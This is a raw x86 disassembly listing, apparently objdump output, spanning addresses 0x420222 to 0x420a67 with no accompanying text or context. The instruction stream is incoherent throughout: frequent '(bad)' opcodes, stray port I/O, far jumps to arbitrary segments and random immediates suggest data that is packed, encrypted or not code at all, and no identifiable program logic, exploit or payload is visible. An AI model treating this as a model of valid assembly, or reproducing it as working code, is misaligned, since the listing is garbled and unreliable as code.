  420222:	add    DWORD PTR [edi+0x4c4a02c9],ebp
  420228:	stos   DWORD PTR es:[edi],eax
  420229:	sub    cl,cl
  42022b:	imul   ebx,DWORD PTR [esi+0x2e1f6328],0x6b
  420232:	stc    
  420233:	retf   
  420234:	dec    eax
  420235:	xchg   esi,eax
  420236:	jg     0x420233
  420238:	push   edi
  420239:	fst    QWORD PTR [ebp-0x1a9a1273]
  42023f:	mov    ebp,0x8e350000
  420244:	push   ss
  420245:	push   es
  420246:	mov    edi,0x7bf359e
  42024b:	call   0x95fabcf0
  420250:	inc    edx
  420251:	push   ds
  420252:	jmp    0x3:0x26000177
  420259:	add    BYTE PTR [ecx+0x61],dl
  42025c:	mov    WORD PTR [ebp+ebp*4-0x6f],es
  420260:	test   BYTE PTR [ebp-0x7675675a],bh
  420266:	(bad)  
  420267:	into   
  420268:	jnp    0x4201ef
  42026a:	inc    esp
  42026b:	mov    dl,0xaf
  42026d:	push   ss
  42026e:	in     al,dx
  42026f:	or     al,0x93
  420271:	test   bl,ah
  420273:	pusha  
  420274:	enter  0x45eb,0x54
  420278:	fild   QWORD PTR [edi+0x4e]
  42027b:	daa    
  42027c:	shl    DWORD PTR [esi+esi*8+0x63],1
  420280:	into   
  420281:	jg     0x420206
  420283:	(bad)  
  420284:	(bad)  
  420285:	dec    ebx
  420286:	out    0xff,al
  420288:	mov    eax,ds:0xdacec53b
  42028d:	inc    eax
  42028e:	seta   BYTE PTR [ebp+0x14]
  420292:	push   edx
  420293:	cdq    
  420294:	jmp    0x420235
  420296:	in     eax,dx
  420297:	int3   
  420298:	in     eax,dx
  420299:	mov    ebx,0x80d16f52
  42029e:	mov    al,0xf8
  4202a0:	cmp    al,0x4c
  4202a2:	scas   al,BYTE PTR es:[edi]
  4202a3:	mov    edx,0xb556a864
  4202a8:	inc    esp
  4202a9:	out    dx,eax
  4202aa:	jb     0x42028f
  4202ac:	mov    DWORD PTR [edx-0x5f],eax
  4202af:	push   0xfffffff7
  4202b1:	mov    esi,0xa2f6fbbb
  4202b6:	xor    ebx,edx
  4202b8:	mov    dh,0x45
  4202ba:	mov    ebx,0xf3332939
  4202bf:	fs test eax,0x3d09b48e
  4202c5:	push   es
  4202c6:	sub    dh,BYTE PTR ds:0x4a39a0d9
  4202cc:	ja     0x4202bd
  4202ce:	xchg   BYTE PTR [eax+0xd],dh
  4202d1:	fdiv   DWORD PTR [ebx-0x7]
  4202d4:	cmp    DWORD PTR [edi+0x51067593],ecx
  4202da:	dec    edi
  4202db:	jmp    ebx
  4202dd:	sbb    BYTE PTR [ebx],bh
  4202df:	retf   0x21f8
  4202e2:	pushf  
  4202e3:	mov    BYTE PTR ds:0xc4ecfeeb,0xb9
  4202ea:	dec    eax
  4202eb:	and    ebp,0xc3eabdfb
  4202f1:	mov    ds:0xc3afe4db,eax
  4202f6:	mov    dl,0x28
  4202f8:	mov    bh,0x2c
  4202fa:	in     al,dx
  4202fb:	xchg   BYTE PTR [edx+0x9],ch
  4202fe:	inc    eax
  4202ff:	test   DWORD PTR [bx+si],0x5b4a593c
  420306:	or     DWORD PTR [edi-0x1f],esi
  420309:	retf   0xbaad
  42030c:	int3   
  42030d:	mov    ebx,0x85b0b63f
  420312:	pop    esp
  420313:	bound  esp,QWORD PTR [ecx+ebx*2+0x3b27e842]
  42031a:	fwait
  42031b:	and    eax,0xb70dde7f
  420320:	retf   0xf490
  420323:	test   BYTE PTR [esi],bl
  420325:	int    0x34
  420327:	mov    ds:0x8f1b97d5,al
  42032c:	and    cl,al
  42032e:	outs   dx,DWORD PTR ds:[esi]
  42032f:	dec    edi
  420330:	xchg   DWORD PTR [ebx+ecx*2-0x50],edi
  420334:	add    cl,BYTE PTR [esi]
  420336:	(bad)  
  420337:	(bad)  
  420338:	(bad)  
  42033a:	adc    DWORD PTR [edi-0x2a],ebp
  42033d:	test   BYTE PTR [eax+0x3bb630c9],0xdd
  420344:	cs add eax,0xe9a379db
  42034a:	xor    DWORD PTR [ebx],esp
  42034c:	mov    esp,DWORD PTR [esi]
  42034e:	ret    
  42034f:	mov    bl,0x6e
  420351:	fmulp  st(0),st
  420353:	jnp    0x420366
  420355:	mov    ebx,0xb7964c8b
  42035a:	(bad)  
  42035b:	cmp    al,ah
  42035d:	into   
  42035e:	mov    ss,edx
  420360:	retf   
  420361:	mov    bl,0x35
  420363:	xor    eax,0x215552ae
  420368:	enter  0x7bb1,0x4f
  42036c:	adc    eax,0x3ca73373
  420371:	test   BYTE PTR [esi],bh
  420373:	repnz sbb al,0xa7
  420376:	jae    0x4203d5
  420378:	cld    
  420379:	cwde   
  42037a:	lahf   
  42037b:	shr    DWORD PTR [eax],0x9c
  42037e:	xor    eax,0x79484d31
  420383:	mov    dl,0x62
  420385:	out    dx,eax
  420386:	jns    0x420372
  420388:	icebp  
  420389:	nop
  42038a:	daa    
  42038b:	in     eax,0x24
  42038d:	pop    ebp
  42038e:	lock pop edi
  420390:	nop
  420391:	jae    0x42034a
  420393:	in     al,0xb2
  420395:	sbb    al,0x16
  420397:	int3   
  420398:	mov    al,0x99
  42039a:	xchg   ebp,esi
  42039c:	push   es
  42039d:	fndisi(8087 only) 
  42039f:	push   ecx
  4203a0:	rol    DWORD PTR [eax+0x22],1
  4203a3:	and    BYTE PTR ds:0x17374b29,ch
  4203a9:	cmp    eax,0x6eec85ef
  4203ae:	sbb    esp,esi
  4203b0:	clc    
  4203b1:	add    ecx,DWORD PTR [esi+ecx*2+0x38a5fdcc]
  4203b8:	fninit 
  4203ba:	sub    al,0x3b
  4203bc:	add    al,0xf1
  4203be:	xor    BYTE PTR [ecx-0x72],cl
  4203c1:	inc    edi
  4203c2:	lods   al,BYTE PTR ds:[esi]
  4203c3:	mov    al,ds:0x84b90f28
  4203c8:	add    ah,BYTE PTR [esi+esi*1+0x4b5d9701]
  4203cf:	and    ebx,ebp
  4203d1:	add    bl,0xcd
  4203d4:	add    edi,DWORD PTR [eax-0x62]
  4203d7:	imul   edx,DWORD PTR [ebx+eiz*4+0x6b404047],0x32
  4203df:	pop    esi
  4203e0:	mov    eax,ds:0x9d27c95b
  4203e5:	loopne 0x4203e5
  4203e7:	push   0xffffffe1
  4203e9:	mov    edx,0xea6775e9
  4203ee:	stos   BYTE PTR es:[edi],al
  4203ef:	pop    edi
  4203f0:	jbe    0x4203df
  4203f2:	mov    ds:0x3681d088,al
  4203f7:	adc    cl,al
  4203f9:	sub    bh,bh
  4203fb:	out    dx,eax
  4203fc:	jns    0x420451
  4203fe:	data16 aas 
  420400:	imul   eax,DWORD PTR [ebp+0x8ada119],0x35131d77
  42040a:	add    edx,DWORD PTR [ebx+0x8e33d1]
  420410:	sbb    bl,BYTE PTR ds:0xd51fd026
  420416:	xor    esi,DWORD PTR [ebp+0x7a]
  420419:	imul   edx,DWORD PTR [ebx-0x2c],0xffffffd9
  42041d:	xchg   esi,eax
  42041e:	push   esp
  42041f:	jecxz  0x42049a
  420421:	and    eax,0x53a7a69b
  420426:	cmp    DWORD PTR [ebp-0x76],eax
  420429:	push   edx
  42042a:	(bad)  
  42042b:	shr    DWORD PTR [eax-0x7b21ff4c],cl
  420431:	sub    DWORD PTR [ebp-0x19],ebx
  420434:	push   esi
  420435:	clc    
  420436:	je     0x4203d3
  420438:	jg     0x420416
  42043a:	lahf   
  42043b:	rol    DWORD PTR [ebx+eax*1-0x6],1
  42043f:	fiadd  WORD PTR [edx]
  420441:	mov    edi,0x297ddfd0
  420446:	dec    esp
  420447:	ds mov ebx,0x4ec5e6a0
  42044d:	cwde   
  42044e:	jne    0x4204ad
  420450:	xchg   ebx,eax
  420451:	add    al,0xba
  420453:	sub    DWORD PTR [esi],esi
  420455:	sar    BYTE PTR ss:[ebp+0x0],0xee
  42045a:	lds    edi,FWORD PTR [ebx+0x69]
  42045d:	push   edx
  42045e:	cmp    cl,BYTE PTR [edx]
  420460:	test   al,0x89
  420462:	jbe    0x420410
  420464:	sti    
  420465:	(bad)  
  420466:	stc    
  420467:	sub    ebx,edi
  420469:	dec    ecx
  42046a:	xchg   esi,eax
  42046b:	xchg   bh,dh
  42046d:	fstp   QWORD PTR [edi-0x4978205e]
  420473:	jp     0x42040c
  420475:	dec    esi
  420476:	jmp    0xac7b:0x244b9007
  42047d:	(bad)  
  42047e:	pusha  
  42047f:	push   0xffffff93
  420481:	ins    DWORD PTR es:[edi],dx
  420482:	fmul   QWORD PTR [edi+esi*1-0x110e59ab]
  420489:	jge    0x420477
  42048b:	push   esp
  42048c:	into   
  42048d:	mov    bl,0xa0
  42048f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420490:	xlat   BYTE PTR ds:[ebx]
  420491:	xchg   ecx,eax
  420492:	stos   DWORD PTR es:[edi],eax
  420493:	mov    al,ds:0x7d4d2e52
  420498:	rcl    BYTE PTR [ebx+0x1ed19bf2],1
  42049e:	mov    bl,0xff
  4204a0:	dec    ebp
  4204a1:	js     0x4204cc
  4204a3:	outs   dx,BYTE PTR ds:[esi]
  4204a4:	inc    esi
  4204a5:	imul   ecx,DWORD PTR ds:0xb4ac8205,0xffffffa8
  4204ac:	lods   eax,DWORD PTR ds:[esi]
  4204ad:	retf   0xbf15
  4204b0:	(bad)
  4204b4:	rol    DWORD PTR [edi-0x39],cl
  4204b7:	inc    esi
  4204b8:	mov    edx,0xb7d56188
  4204bd:	dec    ecx
  4204be:	add    BYTE PTR [esi],dh
  4204c0:	enter  0x8279,0x5d
  4204c4:	push   ds
  4204c5:	pop    esp
  4204c6:	popa   
  4204c7:	mov    edi,0xe3a933fa
  4204cc:	sbb    DWORD PTR [eax],ebx
  4204ce:	out    dx,al
  4204cf:	imul   ebx,DWORD PTR [eax*2+0x5758d28c],0x1a3d528
  4204da:	pop    es
  4204db:	mov    ebp,0xec060678
  4204e0:	or     eax,0xba8830be
  4204e5:	push   ebp
  4204e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204e7:	aaa    
  4204e8:	mul    BYTE PTR [ecx-0x26]
  4204eb:	leave  
  4204ec:	(bad)  
  4204ed:	dec    esi
  4204ee:	bound  esi,QWORD PTR [eax-0x71]
  4204f1:	dec    edx
  4204f2:	out    dx,al
  4204f3:	mov    esp,0x77c53f08
  4204f8:	dec    esp
  4204f9:	and    BYTE PTR [esi-0x784555f3],dh
  4204ff:	push   ebx
  420500:	retf   0x6302
  420503:	pusha  
  420504:	push   0xb1f1c1c5
  420509:	in     al,0x3c
  42050b:	jo     0x4204c7
  42050d:	mov    dh,0x0
  42050f:	add    esi,DWORD PTR [ecx+0x50cfad32]
  420515:	push   ebx
  420516:	push   edx
  420517:	cmovs  ebp,DWORD PTR [ecx+ecx*4+0x2f4aaa5]
  42051f:	mov    ds:0x11d06ce,eax
  420524:	inc    eax
  420525:	(bad)  
  420527:	shr    DWORD PTR [ebx+eax*4+0x29],cl
  42052b:	sbb    al,0xc2
  42052d:	pop    esp
  42052e:	popa   
  42052f:	xchg   esi,eax
  420530:	xor    BYTE PTR [ecx+0x2],dh
  420533:	jg     0x4204c7
  420535:	cwde   
  420536:	out    dx,al
  420537:	mov    bl,0x2d
  420539:	or     eax,0x8d2e0636
  42053e:	push   0xffffffb5
  420540:	sbb    ebp,DWORD PTR [edi-0x34]
  420543:	mov    edi,0x318a52a0
  420548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420549:	sahf   
  42054a:	stos   BYTE PTR es:[edi],al
  42054b:	jmpw   0x39ce
  42054f:	dec    edi
  420550:	arpl   WORD PTR [ebx-0x5577fdb5],dx
  420556:	mov    eax,0xf9f06c39
  42055b:	mov    eax,0x5e262dfe
  420560:	outs   dx,BYTE PTR ds:[esi]
  420561:	inc    esi
  420562:	(bad)  [ecx]
  420564:	shl    BYTE PTR [edx+0xb08c402],1
  42056a:	in     eax,0xcd
  42056c:	xchg   edx,eax
  42056d:	das    
  42056e:	push   ebx
  42056f:	sbb    eax,DWORD PTR [esi]
  420571:	or     edx,DWORD PTR [edx+0x6af50930]
  420577:	pop    ebp
  420578:	jmp    0xd380:0xecd2875a
  42057f:	cli    
  420580:	add    BYTE PTR [eax],al
  420582:	stc    
  420583:	std    
  420584:	in     eax,dx
  420585:	mov    cl,0xed
  420587:	mov    cl,0xfd
  420589:	std    
  42058a:	pop    ds
  42058b:	xor    dl,0xed
  42058e:	(bad)  
  42058f:	std    
  420590:	xchg   esi,eax
  420591:	lods   al,BYTE PTR ds:[esi]
  420592:	adc    BYTE PTR [ebx+0x1],bh
  420595:	add    BYTE PTR [esi],ah
  420597:	add    eax,DWORD PTR [eax]
  420599:	add    BYTE PTR [edi-0x23fe02b0],bl
  42059f:	icebp  
  4205a0:	ja     0x4205a9
  4205a2:	mov    cl,0x5
  4205a4:	aad    0xe2
  4205a6:	ins    BYTE PTR es:[edi],dx
  4205a7:	sahf   
  4205a8:	retf   
  4205a9:	mov    ebp,0x83b00fcb
  4205ae:	xor    esi,DWORD PTR [ebx+esi*8]
  4205b1:	aas    
  4205b2:	stos   BYTE PTR es:[edi],al
  4205b3:	repnz dec ebp
  4205b5:	call   0x323918c
  4205ba:	mov    ds:0x8829a86e,eax
  4205bf:	test   BYTE PTR [edi-0x1e3483c4],al
  4205c5:	std    
  4205c6:	sub    ebx,DWORD PTR [eax]
  4205c8:	imul   esi,DWORD PTR [ebx],0xfffffff5
  4205cb:	pop    ecx
  4205cc:	mov    bl,0x9a
  4205ce:	enter  0x46ce,0xe7
  4205d2:	adc    eax,0x64bef32a
  4205d7:	mov    ebp,ebx
  4205d9:	and    dl,BYTE PTR ds:0xede37d43
  4205df:	jp     0x4205e2
  4205e1:	test   al,0x7
  4205e3:	cld    
  4205e4:	or     ebp,DWORD PTR [ecx+0x3c]
  4205e7:	jb     0x420615
  4205e9:	jo     0x420641
  4205eb:	sub    eax,0x34140b75
  4205f0:	xlat   BYTE PTR ds:[ebx]
  4205f1:	add    bl,cl
  4205f3:	enter  0x4a3e,0x32
  4205f7:	sub    eax,DWORD PTR [eax+ebx*2]
  4205fa:	jmp    0x8b76:0x51516c1e
  420601:	scas   eax,DWORD PTR es:[edi]
  420602:	pop    ds
  420603:	mov    ebx,0xeb52f8c5
  420608:	mov    ecx,0x25ff4111
  42060d:	enter  0xb40c,0xdd
  420611:	pop    ss
  420612:	sub    eax,0xbd2214fd
  420617:	mov    ch,ah
  420619:	or     eax,DWORD PTR [edi]
  42061b:	or     al,0x2f
  42061d:	shr    DWORD PTR [ecx-0xb],0x37
  420621:	xor    bh,BYTE PTR [edx]
  420623:	mov    eax,ds:0xde2a5a3
  420628:	push   esp
  420629:	mov    ch,0xc1
  42062b:	adc    al,0xad
  42062d:	jmp    0x4205cf
  42062f:	(bad)  
  420630:	xor    edx,eax
  420632:	cmp    ebx,ebx
  420634:	fld    DWORD PTR [eax-0xb598bf4]
  42063a:	fwait
  42063b:	loope  0x4205c8
  42063d:	test   DWORD PTR [ebx],0xe4af41a0
  420643:	add    BYTE PTR [edx],bh
  420645:	xchg   edx,eax
  420646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420647:	jno    0x4205f3
  420649:	das    
  42064a:	xor    esi,DWORD PTR [ebx+0x67ffd5f3]
  420650:	int3   
  420651:	pop    ss
  420652:	inc    edx
  420653:	stos   BYTE PTR es:[edi],al
  420654:	repnz enter 0xfcf0,0xe1
  420659:	mov    al,0xdd
  42065b:	mov    bl,0xd7
  42065d:	jmp    0x29ba9bd0
  420662:	mov    esi,0x4aae967d
  420667:	mov    ah,0xba
  420669:	sar    BYTE PTR [eax-0x43],cl
  42066c:	fisub  DWORD PTR [esi+edx*4-0x6f]
  420670:	outs   dx,DWORD PTR ds:[esi]
  420671:	and    eax,0x98c7089
  420676:	fisubr DWORD PTR [esi]
  420678:	xor    dl,dh
  42067a:	jle    0x42065c
  42067c:	push   eax
  42067d:	fwait
  42067e:	in     al,dx
  42067f:	push   cs
  420680:	push   cs
  420681:	(bad)  
  420682:	sbb    al,0x2
  420684:	pusha  
  420685:	mov    cl,0x5b
  420687:	scas   eax,DWORD PTR es:[edi]
  420688:	fdivrp st(0),st
  42068a:	addr16 mov cl,ah
  42068d:	xor    BYTE PTR [esi],dh
  42068f:	mov    esp,esi
  420691:	inc    cl
  420693:	mov    DWORD PTR [ecx+ecx*8+0x3c],0x5307750d
  42069b:	mov    bh,0xdb
  42069d:	inc    ebx
  42069e:	push   edi
  42069f:	push   es
  4206a0:	adc    eax,0xc7ad22c7
  4206a5:	mov    esp,0x41cc9e97
  4206aa:	sbb    ebx,DWORD PTR [ebp-0x7ce16064]
  4206b0:	adc    al,0x7e
  4206b2:	dec    eax
  4206b3:	jg     0x42068a
  4206b5:	or     al,0x2c
  4206b7:	adc    eax,0xb50199ff
  4206bc:	(bad)  [ebx+0x7917bd3]
  4206c2:	cmp    edx,DWORD PTR [ebp+0x33]
  4206c5:	push   edx
  4206c6:	mov    ebx,0x2890b711
  4206cb:	or     eax,DWORD PTR ds:0x7a1f7f27
  4206d1:	arpl   WORD PTR [ecx-0x9a31c23],si
  4206d7:	pop    es
  4206d8:	fild   WORD PTR [ecx+edi*1-0x40b80b6a]
  4206df:	sub    BYTE PTR [edi+0x67],bh
  4206e2:	frstor [esi+edi*2+0x2f691f4]
  4206e9:	add    DWORD PTR [ecx],esi
  4206eb:	icebp  
  4206ec:	xchg   esp,eax
  4206ed:	mov    ebp,0x9d90b25b
  4206f2:	pop    ebx
  4206f3:	(bad)  
  4206f4:	push   eax
  4206f5:	lods   eax,DWORD PTR ds:[esi]
  4206f6:	adc    eax,0x742748d7
  4206fb:	jp     0x4206e4
  4206fd:	xor    bl,BYTE PTR [ecx]
  4206ff:	adc    bh,cl
  420701:	ja     0x42075f
  420703:	xlat   BYTE PTR ds:[ebx]
  420704:	addr16 jnp 0x420729
  420707:	in     al,dx
  420708:	fcomp  DWORD PTR [edi]
  42070a:	push   ss
  42070b:	sub    bh,BYTE PTR [ebp+ebp*2-0x42796b8c]
  420712:	inc    ebx
  420713:	repnz mov ds:0xa094005f,al
  420719:	pop    ebx
  42071a:	inc    eax
  42071b:	push   0xffffff99
  42071d:	push   esp
  42071e:	sbb    DWORD PTR [edi+0x44041fda],esp
  420724:	out    0xad,eax
  420726:	(bad)  
  420727:	or     al,0x93
  420729:	out    0x5,al
  42072b:	mov    ebp,0x8b551d40
  420730:	in     eax,0x4f
  420732:	loope  0x420704
  420734:	sbb    al,al
  420736:	mov    ds:0x68037188,eax
  42073b:	xor    al,BYTE PTR [edi-0x40]
  42073e:	pop    ecx
  42073f:	jnp    0x420787
  420741:	in     al,0xea
  420743:	icebp  
  420744:	adc    edx,esi
  420746:	test   eax,0x9173a895
  42074b:	mov    WORD PTR [ecx-0x4b789b09],ds
  420751:	pop    edx
  420752:	sub    ah,cl
  420754:	int    0xce
  420756:	dec    ecx
  420757:	ror    DWORD PTR [eax+0x2b],cl
  42075a:	mov    eax,DWORD PTR [esi-0x99046ad]
  420760:	int    0x7
  420762:	loopne 0x42076e
  420764:	lock or al,dh
  420767:	mov    eax,0x49c92973
  42076c:	add    eax,0x14764efd
  420771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420772:	push   cs
  420773:	dec    ecx
  420774:	ret    
  420775:	sbb    BYTE PTR [esi+0x18],bh
  420778:	and    al,0xcf
  42077a:	xchg   esi,ebx
  42077c:	cli    
  42077d:	pop    ebx
  42077e:	add    eax,0x4f612cc6
  420783:	xchg   esp,eax
  420784:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420785:	ds mov al,bl
  420788:	jg     0x420782
  42078a:	dec    esp
  42078b:	out    0x29,eax
  42078d:	pop    eax
  42078e:	imul   ebp,eax,0xffffffa7
  420791:	mov    ?,WORD PTR [edx-0x21d4d913]
  420797:	out    0x64,al
  420799:	sbb    eax,0xe8ba1a74
  42079e:	mov    dh,0x6b
  4207a0:	add    al,0x7b
  4207a2:	addr16 jg 0x42080d
  4207a5:	pop    edi
  4207a6:	pop    esi
  4207a7:	sub    eax,0x73bf3eeb
  4207ac:	push   0xcf14c82
  4207b1:	dec    esi
  4207b2:	dec    edi
  4207b3:	dec    bh
  4207b5:	mov    WORD PTR [edi-0x9ae0ff6],fs
  4207bb:	sbb    eax,0x21746312
  4207c0:	dec    edi
  4207c1:	lods   eax,DWORD PTR ds:[esi]
  4207c2:	fwait
  4207c3:	xchg   edi,eax
  4207c4:	ss inc eax
  4207c6:	sbb    BYTE PTR [ebx+eiz*4-0x1e8d0172],dh
  4207cd:	jbe    0x42082d
  4207cf:	lgs    esp,FWORD PTR [ecx+ebx*2-0x2d4fc640]
  4207d7:	mov    al,ds:0x373b10b8
  4207dc:	jb     0x42084e
  4207de:	xlat   BYTE PTR ds:[ebx]
  4207df:	jg     0x420822
  4207e1:	push   ss
  4207e2:	dec    esp
  4207e3:	popa   
  4207e4:	dec    esi
  4207e5:	xor    DWORD PTR [eax],edx
  4207e7:	mov    esp,DWORD PTR [esi+0x1811a502]
  4207ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207ee:	aam    0x7c
  4207f0:	add    dl,dl
  4207f2:	fnstsw WORD PTR [edx+eiz*2+0x46ece684]
  4207f9:	cmp    BYTE PTR [ebx+0x1c],bh
  4207fc:	sub    BYTE PTR [esi],al
  4207fe:	dec    ecx
  4207ff:	inc    ecx
  420800:	test   bl,bh
  420802:	mov    BYTE PTR [ecx],bh
  420804:	sbb    ebp,DWORD PTR [edx]
  420806:	sbb    eax,0xa56839d6
  42080b:	in     al,0x2c
  42080d:	mov    al,ds:0xeeec291a
  420812:	test   eax,0xd48587f2
  420817:	push   ss
  420818:	mov    es,WORD PTR [eax+0x7ac16ae9]
  42081e:	les    esp,FWORD PTR [esi+0x4e0d4f97]
  420824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420825:	xor    esp,esi
  420827:	jg     0x420832
  420829:	sbb    BYTE PTR [esi],bh
  42082b:	ret    
  42082c:	mov    ch,0x56
  42082e:	sti    
  42082f:	sbb    eax,0x898c4122
  420834:	xchg   esp,eax
  420835:	int3   
  420836:	jno    0x42085f
  420838:	sbb    al,0x2e
  42083a:	pop    ebp
  42083b:	mov    ebx,0x82c0dabc
  420840:	sbb    al,0x37
  420842:	cmp    al,0xa1
  420844:	cdq    
  420845:	ds mov al,0x4b
  420848:	cmp    ebx,ebx
  42084a:	and    al,BYTE PTR [edi]
  42084c:	jecxz  0x42086b
  42084e:	pop    ds
  42084f:	inc    edi
  420850:	push   edx
  420851:	enter  0x7886,0xbe
  420855:	and    al,0x51
  420857:	jmp    0x420825
  420859:	mov    al,0x3e
  42085b:	dec    esi
  42085c:	ret    
  42085d:	mov    esi,0xc1a5a23d
  420862:	popf   
  420863:	std    
  420864:	adc    eax,0x5237db24
  420869:	dec    ebp
  42086a:	loop   0x42081f
  42086c:	pop    ebp
  42086d:	mov    ds:0x70350468,al
  420872:	movzx  esi,BYTE PTR [edi+0x79]
  420876:	mov    ah,0xb1
  420878:	fmul   st,st(0)
  42087a:	bound  esi,QWORD PTR [edx-0x1a]
  42087d:	xor    DWORD PTR [edi+0x75],esi
  420880:	retf   0xdc92
  420883:	test   DWORD PTR [edi+0x2277b416],0xf3fc0a0f
  42088d:	retf   
  42088e:	mov    BYTE PTR [esi+0x46eb9e9e],0xb5
  420895:	xor    BYTE PTR [ebx],0xa4
  420898:	std    
  420899:	pop    es
  42089a:	cmp    al,0xc3
  42089c:	jg     0x420846
  42089e:	les    edi,FWORD PTR [edi+eiz*4+0x10]
  4208a2:	out    0x2d,eax
  4208a4:	lea    ebx,[ecx+edi*8+0x17b72b12]
  4208ab:	dec    ebx
  4208ac:	scas   al,BYTE PTR es:[edi]
  4208ad:	ss pop ecx
  4208af:	push   edx
  4208b0:	pop    es
  4208b1:	imul   edi,ecx,0xffffffe5
  4208b4:	add    BYTE PTR [ebp-0x4b],dl
  4208b7:	add    eax,DWORD PTR [ebx]
  4208b9:	jno    0x420890
  4208bb:	push   es
  4208bc:	mov    ecx,0x23cd5a
  4208c1:	add    dl,dh
  4208c3:	rol    BYTE PTR ds:0xf6d53751,0xe3
  4208ca:	out    dx,al
  4208cb:	sub    ebp,esp
  4208cd:	psrlw  mm4,mm5
  4208d0:	or     BYTE PTR [ebx+0x36],bl
  4208d3:	jle    0x4208d6
  4208d5:	add    BYTE PTR [esi],ah
  4208d7:	add    eax,DWORD PTR [eax]
  4208d9:	add    BYTE PTR [edx+esi*1],bh
  4208dc:	pop    edi
  4208dd:	inc    ecx
  4208de:	ror    BYTE PTR [ebp-0x59],1
  4208e1:	adc    edi,0x66
  4208e4:	push   edi
  4208e5:	loopne 0x420955
  4208e7:	aaa    
  4208e8:	mov    eax,0xe24305b1
  4208ed:	ror    BYTE PTR [ebx],0x83
  4208f0:	or     bl,BYTE PTR [ebx+0x2a]
  4208f3:	jmp    0xe3ef:0x97716e51
  4208fa:	pop    edi
  4208fb:	fwait
  4208fc:	adc    bh,BYTE PTR [ebp-0x42cd4264]
  420902:	dec    edi
  420903:	or     dh,BYTE PTR ds:0xfe21ba5
  420909:	xchg   BYTE PTR [ebx+0x13697f89],dl
  42090f:	dec    ebx
  420910:	cmp    cl,BYTE PTR [esp]
  420913:	es mov eax,0x79f427a0
  420919:	push   esi
  42091a:	sar    ecx,cl
  42091c:	mov    al,ds:0x23e4c047
  420921:	rcl    DWORD PTR [ecx-0x4acb1cdc],1
  420927:	push   es
  420928:	sub    DWORD PTR [edx-0x77a742ce],eax
  42092e:	(bad)
  420933:	add    al,0x64
  420935:	push   ebx
  420936:	test   BYTE PTR [ecx],ah
  420938:	xor    eax,0xa106eae9
  42093d:	jmp    0xd24:0xfb5c8be0
  420944:	mov    ebp,0x88097fe
  420949:	pop    ds
  42094a:	call   0x9f3e:0x71042893
  420951:	cmp    eax,0x55089f93
  420956:	push   esi
  420957:	xchg   ebp,eax
  420958:	out    dx,al
  420959:	fcomp  st(5)
  42095b:	sub    eax,0x9147133a
  420960:	cmc    
  420961:	test   BYTE PTR [edi+eiz*4+0x1c0b3dcc],0x85
  420969:	add    eax,0x460c825e
  42096e:	adc    DWORD PTR [edi+0x17],0xffffffea
  420972:	dec    ebp
  420973:	fnsave [ebx-0xe]
  420976:	and    edx,edi
  420978:	add    ah,dl
  42097a:	add    eax,0xaea722a1
  42097f:	test   eax,0xbb9b486a
  420984:	and    eax,0x3761e801
  420989:	rcr    ah,0x19
  42098c:	pop    esi
  42098d:	lock sbb eax,0x8fbc0ed7
  420993:	cmp    edi,DWORD PTR [ebp+0x24]
  420996:	add    ch,cl
  420998:	loopne 0x420a0e
  42099a:	lods   eax,DWORD PTR ds:[esi]
  42099b:	div    DWORD PTR [eax]
  42099d:	push   esp
  42099e:	pop    edi
  42099f:	add    DWORD PTR [eax+0x17],ebp
  4209a2:	clc    
  4209a3:	push   ds
  4209a4:	add    eax,0x8a089132
  4209a9:	(bad)  
  4209aa:	xchg   ecx,eax
  4209ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ac:	sbb    eax,0x5e8157e
  4209b1:	lock repz pop es
  4209b4:	or     eax,0x66ba4612
  4209b9:	or     eax,0xc4283e72
  4209be:	aam    0x69
  4209c0:	add    ebp,DWORD PTR [ebx]
  4209c2:	fidivr WORD PTR [edx-0xe]
  4209c5:	cdq    
  4209c6:	popf   
  4209c7:	jle    0x42096f
  4209c9:	and    edi,DWORD PTR [edi-0x8820394]
  4209cf:	mov    WORD PTR [edi-0x1d],ds
  4209d2:	pop    esp
  4209d3:	inc    edi
  4209d4:	add    eax,0xb2eb01db
  4209d9:	xchg   esi,eax
  4209da:	call   0x2a652ff
  4209df:	(bad)  
  4209e0:	neg    ecx
  4209e2:	jo     0x420a45
  4209e4:	sbb    al,0x30
  4209e6:	add    ebx,eax
  4209e8:	mov    ds:0x4eb88fe6,al
  4209ed:	in     al,dx
  4209ee:	mov    ch,0xe7
  4209f0:	dec    edi
  4209f1:	aaa    
  4209f2:	clc    
  4209f3:	(bad)
  4209f6:	imul   BYTE PTR [edx+0x33]
  4209f9:	je     0x4209d4
  4209fb:	jnp    0x4209ad
  4209fd:	push   ebp
  4209fe:	mov    ebp,0x62cc16ef
  420a03:	ret    0xee47
  420a06:	cmp    DWORD PTR [esi],ebx
  420a08:	in     eax,dx
  420a09:	lahf   
  420a0a:	sub    BYTE PTR [esi+0x64077c16],0xe7
  420a11:	fwait
  420a12:	ret    
  420a13:	out    dx,al
  420a14:	xor    ah,dl
  420a16:	pop    ss
  420a17:	fidivr DWORD PTR [edi]
  420a19:	jg     0x420a6f
  420a1b:	shl    edx,0xb7
  420a1e:	xlat   BYTE PTR ds:[ebx]
  420a1f:	add    al,0xbe
  420a21:	inc    esp
  420a22:	pop    esp
  420a23:	pop    ebx
  420a24:	ret    
  420a25:	cs jns 0x420a6c
  420a28:	stc    
  420a29:	xchg   ecx,eax
  420a2a:	dec    edx
  420a2b:	(bad)  
  420a2c:	aam    0xd7
  420a2e:	nop
  420a2f:	addr16 pusha 
  420a31:	sub    eax,DWORD PTR [edi]
  420a33:	inc    esp
  420a34:	add    DWORD PTR [eax],eax
  420a36:	or     DWORD PTR [edx-0x1e531103],0x3a65abcf
  420a40:	cli    
  420a41:	mov    bl,0x15
  420a43:	mov    ah,0x9e
  420a45:	retf   
  420a46:	xor    eax,0x37db8662
  420a4b:	push   0xe84d317d
  420a50:	cmp    al,0xfb
  420a52:	or     BYTE PTR [ebp-0x5fd103b3],ah
  420a58:	call   0xb7f6:0xecbef098
  420a5f:	adc    cl,BYTE PTR [ecx+0x58]
  420a62:	xchg   ebp,eax
  420a63:	jnp    0x420a92
  420a65:	shl    al,1
  420a67:	aas    
